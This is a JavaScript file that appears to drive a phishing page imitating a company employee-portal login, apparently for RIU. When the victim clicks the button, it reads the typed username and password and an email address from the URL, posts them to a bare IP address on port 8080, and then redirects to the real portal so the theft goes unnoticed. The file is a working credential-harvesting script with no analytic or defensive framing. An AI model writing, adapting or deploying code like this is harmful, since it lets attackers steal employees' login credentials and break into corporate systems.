document.addEventListener('DOMContentLoaded', () => {
    var usernameInput = document.querySelector('input[name="username"]');
    var passwordInput = document.querySelector('input[name="password"]');
    const loginButton = document.querySelector('button[type="button"]');
    const usernameLabel = document.querySelector('label[for="mat-input-0"] mat-label');
    const passwordLabel = document.querySelector('label[for="mat-input-1"] mat-label');

    const errorMessage = document.createElement('p');
    errorMessage.textContent = 'Wrong username or password';
    errorMessage.style.color = 'red';
    errorMessage.style.marginTop = '10px';
    errorMessage.style.display = 'none';
    errorMessage.classList.add('error-message');
    // loginButton.insertAdjacentElement('afterend', errorMessage);

    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email');

    function checkFormValidity() {
        loginButton.disabled = !(usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '');
    }

    function clearPlaceholderAndHideLabel(event) {
        const target = event.target;
        if (target.placeholder) {
            target.placeholder = '';
        }
        if (target === usernameInput && usernameLabel) {
            usernameLabel.style.display = 'none';
        } else if (target === passwordInput && passwordLabel) {
            passwordLabel.style.display = 'none';
        }
    }

    function handleSubmit() {
        // errorMessage.style.display = 'block';

        const data = {
            username: usernameInput.value,
            password: passwordInput.value,
            email: email || ''
        };
        fetch('https://90.170.242.242:8080/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            window.location.href = 'https://portalempleado.riu.com/user/login';
        });
    }

    usernameInput.addEventListener('input', checkFormValidity);
    passwordInput.addEventListener('input', checkFormValidity);
    usernameInput.addEventListener('focus', clearPlaceholderAndHideLabel);
    passwordInput.addEventListener('focus', clearPlaceholderAndHideLabel);
    loginButton.addEventListener('click', handleSubmit);

    checkFormValidity();
});
